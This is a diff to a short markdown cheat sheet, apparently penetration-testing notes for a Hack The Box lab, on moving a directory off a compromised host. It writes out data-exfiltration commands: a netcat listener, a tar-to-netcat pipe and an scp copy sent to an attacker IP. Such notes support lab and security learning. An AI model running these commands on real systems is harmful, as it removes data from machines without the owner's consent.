@@ -6,8 +6,6 @@
 
 ---
 
-Pull a directory off a host with netcat, a Python HTTP server, or scp.
-
 ## Create a dump file
 
 ```bash
@@ -15,7 +13,7 @@ Pull a directory off a host with netcat, a Python HTTP server, or scp.
 nc -lvnp 5555 > dump.tar.gz
 
 # On target
-tar czf - /path/to/directory | nc ATTACKER_IP 5555
+tar czf - /path/to/directory | nc 10.10.14.97 5555
 ```
 
 ## Create a simple HTTP server
@@ -33,10 +31,5 @@ wget -r -np http://tartarsauce.htb:8080/
 
 ```bash
 # On Attacker machine
-scp -r /path/to/directory your-user@ATTACKER_IP:/tmp/
+scp -r /path/to/directory your-user@10.10.14.97:/tmp/
 ```
-
-## Resources
-
-- [cheat.sh/nc](https://cheat.sh/nc) — listen / send
-- [Python 2 SimpleHTTPServer](https://docs.python.org/2/library/simplehttpserver.html) — the `test()` server above
